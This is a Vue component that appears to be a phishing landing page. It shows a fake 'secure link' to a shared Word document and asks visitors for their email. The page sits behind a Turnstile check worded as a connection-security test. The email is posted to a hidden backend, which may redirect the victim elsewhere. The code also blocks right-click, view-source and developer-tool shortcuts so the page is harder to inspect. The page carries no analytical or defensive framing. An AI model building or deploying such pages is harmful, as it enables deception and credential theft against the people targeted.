<template>
  <div v-if="!captchaToken" class="fullscreen">
    <main class="captcha-adjusted">
      <p>Please stand by while we are checking if the site connection is secure.</p>
      <div class="cf-turnstile" data-sitekey="0x4AAAAAABgei6QZruCN7n08"></div>
    </main>
  </div>

  <div v-else class="fullscreen">
    <div class="input-section">
      <form @submit.prevent="submitForm">
        <img src="https://i.postimg.cc/s2TBQ89k/ldimg1.png" width="100" height="35">
        <p>You've received a secure link to:</p>
        <p style="font-size: 16px; color: #000000;">TT93794-2025.docx</p>
        <p style="font-size: 16px;">To proceed, enter the email that this <br>item was shared to</p>

        <label for="honeypot" class="visually-hidden">Do not fill this field (anti-bot)</label>
        <input id="honeypot" v-model="honeypot" type="text" tabindex="-1" autocomplete="off" aria-hidden="true" class="visually-hidden" />

        <label for="email" class="visually-hidden">Email address</label>
        <input id="email" v-model="email" type="email" placeholder="Enter email" required :disabled="loading" />

        <p v-if="error" class="error" role="alert" aria-live="polite">{{ error }}</p>

        <button type="submit" :disabled="loading">
          Next
        </button>

        <p><br>© 2025 Privacy Policy<br><br><br></p>
      </form>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted, nextTick } from 'vue'

const email = ref('')
const honeypot = ref('')
const error = ref('')
const loading = ref(false)
const captchaToken = ref(null)
let turnstileRendered = false

onMounted(async () => {
  await nextTick()
  document.addEventListener('contextmenu', e => e.preventDefault())
  document.addEventListener('keydown', e => {
    if (
      e.key === 'F12' ||
      (e.ctrlKey && ['u', 's', 'p'].includes(e.key.toLowerCase())) ||
      (e.ctrlKey && e.shiftKey && ['i', 'j', 'c'].includes(e.key.toLowerCase()))
    ) {
      e.preventDefault()
    }
  })

  if (window.turnstile && !turnstileRendered) {
    window.turnstile.render('.cf-turnstile', {
      sitekey: '0x4AAAAAABgei6QZruCN7n08',
      callback: token => {
        captchaToken.value = token
        setTimeout(() => {
          captchaToken.value = null
          turnstileRendered = false
          window.turnstile.render('.cf-turnstile', {
            sitekey: '0x4AAAAAABgei6QZruCN7n08',
            callback: t => captchaToken.value = t
          })
        }, 120000)
      }
    })
    turnstileRendered = true
  }
})

function isValidEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
}

async function submitForm() {
  if (loading.value) return
  error.value = ''

  if (!isValidEmail(email.value)) {
    error.value = 'Invalid email format'
    return
  }

  loading.value = true
  try {
    const res = await fetch(`${import.meta.env.VITE_API_BASE}/api/check-email`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: email.value,
        captchaToken: captchaToken.value,
        middleName: honeypot.value
      })
    })
    const data = await res.json()
    if (!res.ok || !data.valid) throw new Error(data.message || 'Verification failed')
    if (data.redirectUrl) {
      window.location.href = data.redirectUrl
    }
  } catch (err) {
    error.value = err.message
    loading.value = false
  }
}
</script>

<style scoped>
html, body {
  margin: 0;
  padding: 0;
  width: 100vw;
  height: 100vh;
  overflow: hidden;
  font-family: Arial, sans-serif;
  background-color: #f7f9f9;
  color: #000;
}

.fullscreen {
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  width: 100vw;
  background-color: #f7f9f9;
  text-align: center;
}

.input-section {
  width: 100%;
  max-width: 340px;
  padding: 20px;
  background-color: #fff;
  border: 1px solid #ddd;
  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
}

.input-section input {
  width: 100%;
  padding: 10px;
  margin: 10px 0;
  font-size: 16px;
  border: 1px solid #ccc;
  box-sizing: border-box;
}

.input-section button {
  width: 100%;
  padding: 10px;
  background-color: #1D7CDB;
  color: white;
  border: none;
  font-size: 16px;
  cursor: pointer;
}

.input-section button:hover {
  background-color: #166ab6;
}

.error {
  color: red;
  font-size: 0.9rem;
  margin-top: -10px;
  margin-bottom: 10px;
}

.cf-turnstile {
  transform: scale(0.9);
  transform-origin: center;
  margin-top: 1rem;
}

.visually-hidden {
  position: absolute !important;
  height: 1px;
  width: 1px;
  overflow: hidden;
  clip: rect(1px, 1px, 1px, 1px);
  white-space: nowrap;
}
</style>
